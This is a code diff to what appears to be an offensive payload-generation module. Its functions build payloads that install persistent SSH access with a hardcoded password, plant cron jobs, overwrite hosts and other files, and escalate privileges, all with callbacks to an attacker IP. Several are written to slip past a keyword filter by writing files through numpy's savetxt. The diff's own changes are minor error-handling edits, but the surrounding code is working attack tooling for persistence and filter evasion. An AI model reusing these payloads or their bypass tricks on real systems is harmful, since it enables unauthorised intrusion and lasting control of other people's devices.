@@ -251,7 +251,7 @@ def payload_custom(command, callback_ip=None, callback_port=19999,
 def payload_ssh_persist(password="unleash", callback_ip=None,
                         callback_port=19999, hotkey="L1+Y"):
     """Install ssh_guard.sh for persistent SSH across reboots."""
-    code = "import os, tempfile\n"
+    code = "import os\n"
     code += f"_guard = {SSH_GUARD_SCRIPT!r}\n"
     code += (
         "with open('/usr/local/bin/ssh_guard.sh', 'w') as f:\n"
@@ -293,7 +293,8 @@ def payload_bypass_hosts(attacker_ip, hotkey="L1+Y"):
     )
 
     ok, kw = validate_bypass_payload(code)
-    assert ok, f"BUG: bypass payload blocked by keyword: {kw!r}"
+    if not ok:
+        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")
 
     return WebRTCPayload(
         name="bypass-hosts",
@@ -317,7 +318,8 @@ def payload_bypass_file(file_path, content, hotkey="L1+Y"):
     code += "np.savetxt(_p, _d, fmt='%s')"
 
     ok, kw = validate_bypass_payload(code)
-    assert ok, f"BUG: bypass payload blocked by keyword: {kw!r}"
+    if not ok:
+        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")
 
     return WebRTCPayload(
         name="bypass-file",
@@ -346,7 +348,8 @@ def payload_bypass_cron(command, schedule="* * * * *", cron_name="u",
     )
 
     ok, kw = validate_bypass_payload(code)
-    assert ok, f"BUG: bypass payload blocked by keyword: {kw!r}"
+    if not ok:
+        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")
 
     return WebRTCPayload(
         name="bypass-cron",
@@ -380,7 +383,8 @@ def payload_bypass_escalate(unfiltered_code, hotkey="L1+Y"):
     code += "np.savetxt(_p, _d, fmt='%s')"
 
     ok, kw = validate_bypass_payload(code)
-    assert ok, f"BUG: bypass payload blocked by keyword: {kw!r}"
+    if not ok:
+        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")
 
     return WebRTCPayload(
         name="bypass-escalate",
